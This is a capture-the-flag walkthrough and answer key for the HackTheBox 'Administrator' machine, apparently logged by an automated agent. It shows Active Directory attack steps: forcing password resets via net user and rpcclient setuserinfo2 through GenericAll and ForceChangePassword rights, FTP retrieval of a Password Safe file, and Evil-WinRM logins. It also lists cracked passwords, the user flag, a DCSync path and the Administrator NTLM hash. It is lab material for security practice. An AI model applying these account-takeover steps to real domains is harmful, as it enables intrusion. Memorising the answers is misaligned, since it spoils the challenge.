# HTB Administrator Guided Questions

1. What is the lowest TCP port listening on Administrator? Answer: 21
2. What permission does the Olivia user have over the Michael user (as shown by BloodHound)? GenericAll
3. What permission does the Michael user have on the Benjamin user? ForceChangePassword
4. What is the name of a non-default group that Benjamin is a part of? Share Moderators
5. What is the Master Password for `Backup.psafe3`? tekieromucho

```
# Change Michael's password to password123
*Evil-WinRM* PS C:\Users\olivia\Desktop> net user michael password123 /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\olivia\Desktop>

# Login as Michael via WinRM
*Evil-WinRM* PS C:\Users\michael\Documents> whoami
administrator\michael
*Evil-WinRM* PS C:\Users\michael\Documents>
```

```
# Tried password change for Benjamin using net user, it didn't work.
*Evil-WinRM* PS C:\Users\michael\Documents> net user benjamin password123 /domain
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\michael\Documents>

# Force password change via rpcclient worked
└─$ run rpcclient -U 'administrator.htb\michael%password123' 10.129.245.95 -c "setuserinfo2 benjamin 23 'password123'"
📋 Logged: /home/openclaw/.openclaw/workspace-neo/htb/boxes/active/Administrator/raw_data/cmd_20260409_193118.log

└─$ run netexec smb 10.129.245.95 -u Benjamin -p 'password123' -d administrator.htb
SMB                      10.129.245.95   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB                      10.129.245.95   445    DC               [+] administrator.htb\Benjamin:password123
📋 Logged: /home/openclaw/.openclaw/workspace-neo/htb/boxes/active/Administrator/raw_data/cmd_20260409_193653.log
```

```
# Found backup.psafe3 in FTP
└─$ ftp 10.129.245.95
Connected to 10.129.245.95.
220 Microsoft FTP Service
Name (10.129.245.95:openclaw): Benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||58347|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
```

6. What is the Emily user's password on Administrator? UXLCI5iETUsIBoFVTj8yQFKoHjXmb

Got user.txt via WinRM as Emily.

```
└─$ evil-winrm -i 10.129.245.95 -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> dir


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---          4/9/2026   8:54 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> cat user.txt
3ff853d4941be6f97bb9ca31e41d813c
```

8. What permission does the Emily user have over the Ethan user? GenericWrite
9. What is the Ethan user's password on Administrator? limpbizkit
10. What permission does the Ethan user have over the domain (according to Bloodhound) that will allow for a full domain takeover? DcSync
11. What is the Administrator user's NTLM hash? 3dc553ce4b9fd20bd016e098d2d2fd2e
